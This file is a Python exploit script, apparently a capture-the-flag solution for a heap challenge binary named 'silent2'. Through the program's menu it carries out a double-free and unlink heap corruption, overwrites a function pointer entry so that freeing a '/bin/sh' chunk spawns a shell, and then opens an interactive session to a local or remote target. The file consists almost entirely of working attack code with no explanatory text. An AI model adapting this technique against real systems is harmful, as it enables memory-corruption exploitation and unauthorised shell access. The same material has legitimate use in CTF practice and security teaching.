#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from zio import *
from time import sleep
import sys

def add(size,content):
    io.writeline('1')
    io.writeline(str(size))
    io.writeline(content)
    io.writeline()


def delete(index):
    io.writeline('2')
    io.writeline(str(index))

def edit(index,content):
    io.writeline('3')
    io.writeline(str(index))
    #  raw_input('go')
    io.write(content)


def exploit(flag):
    add(0x90,'0'*0x8f)
    add(0x90,'/bin/sh\x00')
    add(0x90,'2'*0x8f)
    add(0x90,'3'*0x8f)
    add(0xa0,'4'*0x9f)
    add(0x100,'5'*0xff)

    # double-free-unlink
    payload = l64(0)+l64(0)
    payload += l64(0x6020d8-0x18)+l64(0x6020d8-0x10)
    payload = payload.ljust(0x90,'A')
    payload += l64(0x90)+l64(0xb0)
    delete(3)
    delete(4)
    add(0x140,payload)
    delete(4)
    # Spawn Shell
    edit(3,l64(0x602018))
    edit(0,l64(0x400730))
    delete(1)

    io.interact()
    io.close()

if __name__ == "__main__":
    conn = ("39.107.32.132", 10001) if sys.argv[1] == 'r' else "./silent2"
    io = zio(conn, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "red"))
    exploit(0)

